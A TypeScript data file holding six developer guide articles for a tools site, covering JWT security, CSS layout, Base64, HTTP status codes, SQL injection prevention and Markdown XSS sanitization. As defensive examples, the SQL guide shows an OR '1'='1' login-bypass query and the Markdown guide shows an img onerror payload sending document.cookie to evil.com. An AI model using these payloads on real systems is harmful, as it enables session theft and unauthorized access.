export interface Guide {
  slug: string;
  title: string;
  description: string;
  category: string;
  readTime: string;
  date: string;
  relatedTool: {
    name: string;
    href: string;
  };
  contentHtml: string;
}

export const guides: Guide[] = [
  {
    slug: "jwt-authentication-security-best-practices",
    title: "JSON Web Tokens (JWT): Security Best Practices & Token Architecture",
    description: "An in-depth architectural guide on stateless session management, algorithmic vulnerabilities, token revocation strategies, and cross-site scripting mitigation.",
    category: "Security & Auth",
    readTime: "9 min read",
    date: "2026-10-15",
    relatedTool: {
      name: "JWT Decoder & Inspector",
      href: "/jwt-decoder",
    },
    contentHtml: `
      <h2>1. The Architecture of a JSON Web Token</h2>
      <p>A JSON Web Token (JWT) is an open industry standard (RFC 7519) designed to securely transmit verifiable claims between two distributed computing parties. Compact, URL-safe, and digitally signed, JWTs are fundamental to modern OAuth 2.0 and OpenID Connect specifications.</p>
      <p>A typical serialized token consists of three distinct components separated by dots: the Header, the Payload, and the Signature.</p>
      <pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFsZXggRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</code></pre>
      
      <h2>2. Critical Security Pitfalls</h2>
      <p>Developers routinely introduce vulnerabilities through misconfiguration:</p>
      <ul>
        <li><strong>The 'none' Algorithm Vulnerability:</strong> Never accept unverified header algorithms where the signature verification routine is bypassed. Always enforce strict verification on the server side.</li>
        <li><strong>Weak Symmetric Secrets:</strong> Using short or predictable HMAC secrets exposes the token to offline dictionary brute-force attacks. Use cryptographically secure keys of at least 256 bits (HMAC-SHA256).</li>
        <li><strong>Storing Sensitive Secrets in Claims:</strong> A JWT payload is merely Base64Url-encoded, not encrypted. Anyone who intercepts the token can decode and inspect its contents immediately.</li>
      </ul>

      <h2>3. Where to Safely Store JWTs</h2>
      <p>Storing access tokens in <code>localStorage</code> or <code>sessionStorage</code> exposes applications to Cross-Site Scripting (XSS). An attacker injecting malicious JavaScript can exfiltrate stored tokens effortlessly.</p>
      <p>The industry gold standard is to store access and refresh tokens inside <strong>HttpOnly, Secure, SameSite=Strict cookies</strong>. This ensures the browser automatically attaches credentials while completely isolating the token string from client-side script execution.</p>
    `,
  },
  {
    slug: "css-grid-vs-flexbox-guide",
    title: "CSS Grid vs. Flexbox: Architectural Comparison for Modern Web Layouts",
    description: "A comprehensive developer guide detailing one-dimensional versus two-dimensional styling mechanics, responsive breakpoints, and rendering performance.",
    category: "Frontend Development",
    readTime: "7 min read",
    date: "2026-10-16",
    relatedTool: {
      name: "CSS Grid & Layout Builder",
      href: "/grid-generator",
    },
    contentHtml: `
      <h2>1. Fundamental Paradigm: 1D vs. 2D Layouts</h2>
      <p>The primary architectural divergence between Flexbox and CSS Grid lies in their coordinate dimensionality:</p>
      <ul>
        <li><strong>Flexbox (One-Dimensional):</strong> Optimized for arranging items along a single axis—either horizontal rows or vertical columns. While flex items can wrap, cross-axis alignment operates independently row-by-row.</li>
        <li><strong>CSS Grid (Two-Dimensional):</strong> Designed to orchestrate rows and columns simultaneously within a strict or fluid matrix, maintaining coordinated column and row alignments across the entire layout.</li>
      </ul>

      <h2>2. Responsive Layouts without Media Queries</h2>
      <p>One of the most powerful features of modern CSS Grid is dynamic column wrapping using <code>repeat()</code>, <code>auto-fit</code>, and the <code>minmax()</code> function:</p>
      <pre><code>.grid-container {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
  gap: 1.5rem;
}</code></pre>
      <p>This declarative snippet enables elements to automatically reorganize into responsive columns based on available container width without requiring breakpoint overrides.</p>
    `,
  },
  {
    slug: "base64-encoding-explained",
    title: "Base64 Encoding Demystified: Binary Representation & Data URIs",
    description: "Deep dive into RFC 4648 binary-to-text translation, 6-bit chunk partitioning, padding mechanics, and computational performance overhead.",
    category: "Data Encoding",
    readTime: "8 min read",
    date: "2026-10-17",
    relatedTool: {
      name: "Base64 Encoder & Decoder",
      href: "/base64-converter",
    },
    contentHtml: `
      <h2>1. Why Base64 Exists</h2>
      <p>Base64 (RFC 4648) was designed to represent raw arbitrary binary data within textual transport systems that safely handle only human-readable ASCII characters, such as SMTP email bodies, JSON payloads, and XML configurations.</p>

      <h2>2. Mathematical Mechanics: The 6-Bit Partition</h2>
      <p>Standard computing uses 8-bit octets (bytes) yielding 256 possible permutations. Base64 compresses three 8-bit bytes (24 bits total) into four 6-bit index groups ($2^6 = 64$ values), mapping each directly to an alphanumeric character set.</p>

      <h2>3. Bandwidth Overhead and Performance</h2>
      <p>Because four characters are used to transmit three bytes of source binary data, Base64 encoding inherently incurs an approximate <strong>33% bandwidth overhead</strong>. Embedding high-resolution multimedia inside Data URIs increases document size and circumvents browser caching mechanisms.</p>
    `,
  },
  {
    slug: "http-status-codes-debugging-guide",
    title: "HTTP Status Codes Demystified: Practical API Debugging & Design",
    description: "A definitive guide to standard HTTP response codes (2xx, 3xx, 4xx, 5xx), semantic API design, caching headers, and debugging distributed architectures.",
    category: "Web Architecture",
    readTime: "10 min read",
    date: "2026-10-24",
    relatedTool: {
      name: "JSON Formatter & Validator",
      href: "/json-formatter",
    },
    contentHtml: `
      <h2>1. The Semantic Importance of HTTP Status Codes</h2>
      <p>Hypertext Transfer Protocol status codes are standardized three-digit integers defined across RFC 7231 and RFC 9110. They communicate the operational result of a client request to browsers, API gateways, reverse proxies, and caching layers.</p>
      <p>Misusing status codes—such as returning a <code>200 OK</code> response containing an <code>{"error": true}</code> body—breaks upstream edge caches (Cloudflare, Fastly), confuses monitoring telemetry, and violates semantic REST principles.</p>

      <h2>2. Critical Status Codes Every Engineer Must Master</h2>
      <h3>2xx Success</h3>
      <ul>
        <li><strong>200 OK:</strong> Standard response for successful synchronous operations.</li>
        <li><strong>201 Created:</strong> The request succeeded and led to the creation of a new persistent resource (typically paired with a <code>Location</code> header).</li>
        <li><strong>204 No Content:</strong> The action was fulfilled successfully, but the server does not need to return an entity-body (common in <code>DELETE</code> actions).</li>
      </ul>

      <h3>4xx Client Errors</h3>
      <ul>
        <li><strong>400 Bad Request:</strong> The server cannot process the request due to malformed syntax, invalid JSON, or failing validation schemas.</li>
        <li><strong>401 Unauthorized:</strong> Semantically means <em>unauthenticated</em>. The client lacks valid authentication credentials.</li>
        <li><strong>403 Forbidden:</strong> The client is authenticated, but their identity lacks the authorization privileges required to access the target resource.</li>
        <li><strong>404 Not Found:</strong> The requested resource does not exist or the server wishes to obscure its existence from unauthorized callers.</li>
        <li><strong>429 Too Many Requests:</strong> Rate limiting triggered. RFC standards suggest attaching a <code>Retry-After</code> header.</li>
      </ul>

      <h3>5xx Server Errors</h3>
      <ul>
        <li><strong>500 Internal Server Error:</strong> An unhandled exception or critical crash occurred inside server-side code execution.</li>
        <li><strong>502 Bad Gateway:</strong> An edge proxy received an invalid or corrupt response from an upstream backend server.</li>
        <li><strong>503 Service Unavailable:</strong> The server is temporarily overloaded or undergoing maintenance.</li>
        <li><strong>504 Gateway Timeout:</strong> An intermediary proxy did not receive a timely response from an upstream process.</li>
      </ul>

      <h2>3. Designing Clean API Error Payloads</h2>
      <p>Pair HTTP status codes with machine-readable error bodies (such as RFC 7807 Problem Details for HTTP APIs):</p>
      <pre><code>{
  "type": "https://api.devtools-web.com/errors/invalid-payload",
  "title": "Unprocessable Entity",
  "status": 422,
  "detail": "Field 'email' must contain a valid domain address.",
  "instance": "/v1/users/create"
}</code></pre>
    `,
  },
  {
    slug: "sql-injection-prevention-formatting",
    title: "SQL Injection Prevention: Parameterized Queries & Sanitization Guide",
    description: "An architectural deep dive into database security, parameterized queries, ORM safety limits, and query readability best practices.",
    category: "Database & Security",
    readTime: "8 min read",
    date: "2026-10-25",
    relatedTool: {
      name: "SQL Formatter & Beautifier",
      href: "/sql-formatter",
    },
    contentHtml: `
      <h2>1. The Anatomy of a SQL Injection (SQLi)</h2>
      <p>SQL Injection remains one of the critical security threats categorized under OWASP Top 10 vulnerabilities. It occurs when untrusted user input is directly concatenated or interpolated into a raw SQL query string instead of being treated as isolated literal data.</p>
      <pre><code>-- Vulnerable Raw Concatenation
SELECT * FROM users WHERE email = '' OR '1'='1' --' AND password = 'xxx';</code></pre>
      <p>In this classic attack vector, malicious SQL clauses modify the semantic logic of the query parser, causing the database to bypass authentication checks and expose unauthorized tables.</p>

      <h2>2. Defense in Depth: Prepared Statements & Parameterization</h2>
      <p>The only universally effective defense against SQL injection is the strict use of <strong>Parameterized Queries (Prepared Statements)</strong>. Parameterization decouples the query compilation step from user data binding:</p>
      <pre><code>// Secure Node.js PostgreSQL Example
const text = 'SELECT id, email, role FROM users WHERE email = $1 AND active = $2';
const values = [userSuppliedEmail, true];
const res = await pool.query(text, values);</code></pre>
      <p>Because the database engine pre-compiles the query blueprint prior to binding parameters, malicious inputs are evaluated strictly as string literals, completely preventing semantic code execution.</p>

      <h2>3. Common Misconceptions with ORMs</h2>
      <p>While Object-Relational Mappers (Prisma, Drizzle, Hibernate) use prepared statements for standard helper methods (e.g., <code>findUnique()</code>), using raw bypass methods such as <code>db.$queryRawUnsafe()</code> or raw string template substitutions immediately reintroduces critical injection vulnerabilities if not parameterized manually.</p>
    `,
  },
  {
    slug: "markdown-parsing-ast-security-guide",
    title: "Markdown Parsing, Abstract Syntax Trees (AST), and XSS Sanitization",
    description: "Understanding how Markdown transforms into Abstract Syntax Trees, raw HTML conversion, and mitigating stored Cross-Site Scripting (XSS).",
    category: "Web Architecture",
    readTime: "7 min read",
    date: "2026-10-26",
    relatedTool: {
      name: "Markdown Live Previewer",
      href: "/markdown-previewer",
    },
    contentHtml: `
      <h2>1. How Markdown Engines Process Text</h2>
      <p>Markdown is not rendered directly into HTML in modern architectures. Modern parsers (like Unified, Remark, and Marked) process source strings through three sequential compiler stages:</p>
      <ol>
        <li><strong>Lexical Analysis:</strong> The raw text is broken down into semantic tokens (headings, emphasis, code blocks, lists).</li>
        <li><strong>Abstract Syntax Tree (AST):</strong> A tree data structure (such as mdast) represents the semantic hierarchy of nodes.</li>
        <li><strong>HTML Compilation:</strong> The AST is compiled into corresponding valid HTML tags (<code>&lt;h1&gt;</code>, <code>&lt;p&gt;</code>, <code>&lt;pre&gt;</code>).</li>
      </ol>

      <h2>2. Mitigating Stored Cross-Site Scripting (XSS)</h2>
      <p>By default, CommonMark specifications allow raw HTML within Markdown input. If an application directly renders compiled Markdown into the DOM without sanitization, malicious actors can inject active JavaScript payloads:</p>
      <pre><code>[Click for Bonus](javascript:stealSessionCookies())
&lt;img src="invalid-image" onerror="fetch('https://evil.com/logger?cookie='+document.cookie)" /&gt;</code></pre>
      <p>To safely render user-generated Markdown in web applications, always pass compiled output through a strict sanitizer like <strong>DOMPurify</strong> or sanitize trees natively via plugins like <code>rehype-sanitize</code>.</p>
    `,
  },
];